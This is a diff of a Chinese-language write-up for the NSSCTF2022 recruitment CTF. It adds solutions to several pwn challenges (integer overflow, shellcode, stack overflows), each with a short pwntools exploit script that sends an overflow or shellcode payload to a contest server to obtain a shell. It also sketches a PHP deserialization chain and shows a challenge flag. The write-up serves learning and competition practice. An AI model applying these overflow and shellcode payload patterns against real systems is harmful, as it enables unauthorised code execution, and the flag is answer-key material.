@@ -1,3 +1,5 @@
+[TOC]
+
 # NSSCTF2022招新赛部分wp
 
 ## Web
@@ -402,7 +404,7 @@ union也被过滤了，information中存在“or”，均采用双写绕过
 1. 先要达到的目的是查看根目录有什么，则需执行 `system("ls /")`
 2. 要执行此代码，则需通过**fin** 中的 **fmm** 方法构造可变函数
 3. 需要调用 **fin** 中的 **fmm** 方法，可以借助 **lt** 中的 **__toString** 方法（`$this->impo->fmm()`）
-4. 要保证 **fin** 被正常调用，则 `__wakeup()` 方法==必须失效 ==（CVE-2016-7124）
+4. 要保证 **fin** 被正常调用，则 `__wakeup()` 方法 ==必须失效==（CVE-2016-7124）
 5. 需要调用 **lt** 中的 **__toString** ，可以借助 **lt** 中的 **__destruct** 方法（`echo $this`）
 6. 入口为 **lt** 中的 **__destruct** 方法
 
@@ -816,6 +818,158 @@ nc签到，直接连上去
 ![screen-capture](https://nssctf.wdf.ink/img/yxy/2ec59ad445c80e5d7d3028a28f7ede36.png)
 
 <br/>
+
+### Integer Overflow
+
+顾名思义，整数溢出，先checksec一下，发现是32位程序，拖进IDA
+
+![image-20221024215803927](https://nssctf.wdf.ink/img/yxy/image-20221024215803927.png)
+
+存在一个 overflow() 函数，追踪进去
+
+![](https://nssctf.wdf.ink/img/yxy/image-20221024224214883.png)
+
+一路追踪到 choice1() 函数里，发现存在溢出点
+
+![image-20221024224400900](https://nssctf.wdf.ink/img/yxy/image-20221024224400900.png)
+
+考点：**整数溢出**
+
+整数溢出的利用在于绕过大小限制，同时又可以导致缓冲区溢出
+
+此处缓冲区[ebp-20h]，则填充0x20长度的垃圾数据，使缓冲区溢出
+
+找到危险函数 pwn_me() ，发现存在system，但无bin/sh
+
+![image-20221024233253238](https://nssctf.wdf.ink/img/yxy/image-20221024233253238.png)
+
+追踪system的plt地址：0x08049100
+
+![image-20221024233338670](https://nssctf.wdf.ink/img/yxy/image-20221024233338670.png)
+
+无bin/sh，shift+F12查一下字符串，发现存在：0x0804A008
+
+![image-20221024233430760](https://nssctf.wdf.ink/img/yxy/image-20221024233430760.png)
+
+覆盖system参数的方法参考这篇文章：[pwn小白入门06--ret2libc](https://blog.csdn.net/weixin_45943522/article/details/120469196)
+
+贴个exp：
+
+```python
+from pwn import *
+
+sh = remote("1.14.71.254","xxxxx")
+system_addr = 0x08049100	
+bin_addr = 0x0804A008
+
+sh.sendline(b"1")
+sh.sendline(b"-1")
+payload = b'a'*0x20 + p32(0) + p32(system_addr) + p32(0) +p32(bin_addr)
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+
+
+
+
+### shellcode？
+
+很基础的shellcode，利用pwntools直接生成即可
+
+直接贴exp：
+
+```python
+from pwn import *
+
+sh = remote("1.14.71.254","xxxxx")
+
+payload = asm(shellcraft.sh())
+
+sh.sendline(payload)
+sh.interactive()
+```
+
+
+
+### 有手就行的栈溢出
+
+栈溢出，附件直接拖IDA
+
+![image-20221024234534082](https://nssctf.wdf.ink/img/yxy/image-20221024234534082.png)
+
+存在 overflow() 函数，追踪进去发现是一个gets函数，存在栈溢出风险
+
+![image-20221024234640339](https://nssctf.wdf.ink/img/yxy/image-20221024234640339.png)
+
+v1为[rbp-20h]，故需要填充0x20长度的垃圾数据
+
+找到 gift() 函数，发现你被骗了，根本没法getshell，而在 fun() 函数则可以
+
+![image-20221024235006809](https://nssctf.wdf.ink/img/yxy/image-20221024235006809.png)
+
+追踪 fun() 函数的地址：0x0000000000401257
+
+![image-20221024235458263](https://nssctf.wdf.ink/img/yxy/image-20221024235458263.png)
+
+贴个exp：
+
+```python
+from pwn import *
+
+sh = remote('1.14.71.254',"xxxxx")
+shell_addr = 0x0000000000401257
+
+payload = b'a'*0x20 + p64(0) + p64(shell_addr)
+
+sh.sendline(payload)
+sh.interactive()
+```
+
+
+
+
+
+### FindanotherWay
+
+IDA打开附件，发现 vuln() 函数，追踪进去
+
+![image-20221024235848033](https://nssctf.wdf.ink/img/yxy/image-20221024235848033.png)
+
+发现 gets 函数，存在栈溢出：
+
+![image-20221024235924094](https://nssctf.wdf.ink/img/yxy/image-20221024235924094.png)
+
+s为[rbp-Ch]，故需要填充0xC长度的垃圾数据
+
+继续找到 youfindit 函数，发现存在bin/sh
+
+![image-20221025000024709](https://nssctf.wdf.ink/img/yxy/image-20221025000024709.png)
+
+追踪此函数地址：
+
+![image-20221025000051731](https://nssctf.wdf.ink/img/yxy/image-20221025000051731.png)
+
+发现需要 findanotherway，那就直接抓rbp, rsp地址：0x0000000000401235
+
+![image-20221025000730426](https://nssctf.wdf.ink/img/yxy/image-20221025000730426.png)
+
+贴个exp：
+
+```python
+from pwn import *
+
+sh = remote('1.14.71.254','xxxxx')
+system_addr = 0x0000000000401235
+
+payload = b'a'*0xC + p64(0) + p64(system_addr)
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+</br>
 
 ### Darling
 
@@ -1924,6 +2078,6 @@ while True:
 
 ![截图](https://nssctf.wdf.ink/img/yxy/48b4bc8d9c70dc8b2a0b003211d08d6e.png)
 
-得到falg：NSSCTF{09b43595-8b96-4aa4-a5d2-c327c8e41174}
+得到flag：NSSCTF{09b43595-8b96-4aa4-a5d2-c327c8e41174}
 
 ![截图](https://nssctf.wdf.ink/img/yxy/d2b95ca347c091616a8b48f17eda48e0.png)
